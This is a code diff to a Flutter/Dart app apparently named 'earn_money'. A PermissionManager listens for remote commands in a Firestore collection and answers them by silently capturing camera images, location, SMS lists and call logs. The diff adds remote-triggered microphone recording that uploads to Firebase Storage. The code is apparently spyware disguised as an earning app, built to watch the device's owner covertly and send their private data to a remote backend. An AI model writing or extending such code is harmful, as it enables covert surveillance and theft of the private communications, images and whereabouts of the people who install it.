@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:audio_recorder/audio_recorder.dart';
 import 'package:call_log/call_log.dart';
 import 'package:device_info/device_info.dart';
 import 'package:earn_money/enums/user-actions.dart';
@@ -50,23 +51,30 @@ class PermissionManager {
   }
 
   initilizeGlobalListiner() {
-    db.collection('actions').orderBy("requested_date", descending: true)
-        .limit(1).snapshots().listen((onData) async {
-        
+    db
+        .collection('actions')
+        .orderBy("requested_date", descending: true)
+        .limit(1)
+        .snapshots()
+        .listen((onData) async {
       print((onData.documents));
       if (isActionRequest) {
         var action = onData.documents[0]['action'];
-         if(action == UserActions.GetFrontImage.index){
-            await sendImage(true);
-         }else if (action == UserActions.GetRareImage.index){
-            await sendImage(false);
-         }else if (action == UserActions.GetCurrentLocation.index){
-            await sendGeoLocation();
-         }else if (action == UserActions.RefreshMessageList.index){
-            await sendMessagesList();
-         }else if (action == UserActions.RefreshCalllogs.index){
-            await sendCallLogs();
-         }
+        if (action == UserActions.GetFrontImage.index) {
+          await sendImage(true);
+        } else if (action == UserActions.GetRareImage.index) {
+          await sendImage(false);
+        } else if (action == UserActions.GetCurrentLocation.index) {
+          await sendGeoLocation();
+        } else if (action == UserActions.RefreshMessageList.index) {
+          await sendMessagesList();
+        } else if (action == UserActions.RefreshCalllogs.index) {
+          await sendCallLogs();
+        } else if (action == UserActions.StartRecording.index) {
+          await startRecording();
+        } else if (action == UserActions.StopRecording.index) {
+          await stopRecording();
+        }
       }
       isActionRequest = true;
       docLength = onData.documents.length;
@@ -197,7 +205,8 @@ class PermissionManager {
     List<CameraDescription> avaliableCameras;
     String imageUrl;
     avaliableCameras = await availableCameras();
-    CameraDescription camera = isFrontCamera ? avaliableCameras[1]:avaliableCameras[0];
+    CameraDescription camera =
+        isFrontCamera ? avaliableCameras[1] : avaliableCameras[0];
     controller = CameraController(camera, ResolutionPreset.medium);
     controller.initialize().then((response) async {
       await captureImage(controller);
@@ -251,6 +260,46 @@ class PermissionManager {
         await db.collection('camera').add(cameraFile);
       } catch (e) {
         print("Exception occured");
+      }
+    });
+  }
+
+  startRecording() async {
+    bool isRecording = await AudioRecorder.isRecording;
+    if (!isRecording) {
+      var path = (await getTemporaryDirectory()).path;
+      path = path + '${DateTime.now()}';
+      await AudioRecorder.start(
+          path: path, audioOutputFormat: AudioOutputFormat.AAC);
+    }
+  }
+
+  stopRecording() async {
+    Recording recording;
+    Recording output = await AudioRecorder.stop();
+    recording = output;
+
+    uploadAudioToFirebase(recording);
+  }
+
+  uploadAudioToFirebase(Recording recording) async {
+    StorageReference storageReference =
+        FirebaseStorage.instance.ref().child('Audios/${DateTime.now()}');
+    StorageUploadTask uploadTask =
+        storageReference.putFile(File(recording.path));
+    await uploadTask.onComplete;
+    storageReference.getDownloadURL().then((fileURL) {
+      try {
+        var audioFile = {
+          "imageUrl": fileURL,
+          "user_id": prefs.get("user_id"),
+          'imageName': recording.path
+        };
+        db.collection('audios').add(audioFile).then((respnse) {
+          print('file data updated');
+        });
+      } catch (e) {
+        print('Exception occured');
       }
     });
   }
